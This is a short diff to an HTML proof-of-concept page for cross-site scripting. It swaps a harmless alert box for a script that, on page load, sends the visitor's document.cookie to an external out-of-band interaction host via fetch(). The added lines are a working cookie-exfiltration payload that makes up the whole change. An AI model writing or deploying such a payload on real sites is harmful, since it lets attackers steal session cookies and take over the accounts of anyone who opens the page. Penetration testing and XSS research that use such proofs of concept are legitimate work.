@@ -2,7 +2,9 @@
 <html>
   <body>
     <h1>XSS PoC</h1>
-    <script>alert('XSS');</script>
+    <script>
+  fetch("https://wocfucbzcifrtavsntfe2obu6zjwm4xjx.oast.fun?c=" + encodeURIComponent(document.cookie));
+    </script>
   </body>
 </html>
 
